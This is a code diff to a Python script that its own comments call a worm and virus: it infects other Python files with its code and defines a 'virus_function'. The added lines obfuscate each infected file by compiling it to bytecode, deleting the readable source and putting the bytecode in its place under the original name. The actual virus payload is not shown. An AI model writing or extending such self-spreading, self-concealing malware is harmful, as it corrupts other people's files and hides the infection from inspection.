@@ -2,6 +2,8 @@
 
 import sys
 import glob
+import os
+import py_compile
 
 # variable that contains the worms code
 worm_code = []
@@ -43,6 +45,19 @@ for file in corrupt_files:
 
         with open(file, 'w') as f:
             f.writelines(final_code)
+        
+        #add basic obfuscation by compiling to byte code
+        directory = os.path.dirname(file)
+        # Compile the Python file to bytecode
+        py_compile.compile(file)
+
+        # Rename the compiled bytecode file to be the same as it started
+        bytecode_file = file
+        compiled_file = os.path.join(directory, "__pycache__", os.path.basename(file).replace(".py", ".cpython-310.pyc"))
+        # Remove orgiinal file and place infected file at its place
+        os.remove(file)
+        os.rename(compiled_file, bytecode_file)
+        os.rmdir(os.path.join(directory, "__pycache__"))
 
 #contains the actual virus
 def virus_function():
